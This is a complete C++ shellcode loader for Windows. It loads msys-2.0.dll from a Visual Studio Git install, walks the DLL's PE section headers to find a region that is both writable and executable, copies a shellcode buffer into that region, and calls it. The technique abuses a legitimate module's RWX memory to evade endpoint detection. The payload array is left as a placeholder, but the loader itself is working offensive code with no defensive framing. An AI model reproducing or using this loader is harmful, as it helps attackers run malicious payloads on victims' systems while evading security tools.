#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <DbgHelp.h>

typedef void (*ShellcodeFunc)();

// Function to write the shellcode to the RWX section
void WriteShellcodeToSection(LPVOID rwxSectionAddr, const char* shellcode, SIZE_T shellcodeSize)
{
    // Copy the shellcode to the RWX section
    memcpy(rwxSectionAddr, shellcode, shellcodeSize);
    std::cout << "Shellcode written to RWX memory region (" << shellcodeSize << " bytes)" << std::endl;
}

int main()
{
    const char* dllPath = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll";

    // Shellcode"
    unsigned char shellcodeRaw[] = { /* raw shellcode here */ };

    // Load the DLL
    HMODULE hDll = LoadLibraryA(dllPath);
    if (hDll == NULL)
    {
        std::cout << "Failed to load the DLL. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    // Get the module information of the loaded DLL
    MODULEINFO moduleInfo;
    if (!GetModuleInformation(GetCurrentProcess(), hDll, &moduleInfo, sizeof(MODULEINFO)))
    {
        std::cout << "Failed to get module information. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    // Find the address of the RWX section
    LPVOID rwxSectionAddr = nullptr;
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hDll);
    if (ntHeader != nullptr)
    {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
        {
            DWORD characteristics = sectionHeader->Characteristics;
            if ((characteristics & IMAGE_SCN_MEM_WRITE) && (characteristics & IMAGE_SCN_MEM_EXECUTE))
            {
                // Calculate the address of the RWX section
                rwxSectionAddr = reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(moduleInfo.lpBaseOfDll) + sectionHeader->VirtualAddress);
                break;
            }
            sectionHeader++;
        }
    }

    if (rwxSectionAddr == nullptr)
    {
        std::cout << "Failed to find the RWX section address." << std::endl;
        return 1;
    }

    std::cout << "RWX section found at the address: " << rwxSectionAddr << std::endl;

    // Write the shellcode to the RWX section
    SIZE_T shellcodeSize = sizeof(shellcodeRaw);
    WriteShellcodeToSection(rwxSectionAddr, reinterpret_cast<const char*>(shellcodeRaw), shellcodeSize);

    // Execute the shellcode
    ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(rwxSectionAddr);
    shellcodeFunc();

    return 0;
}
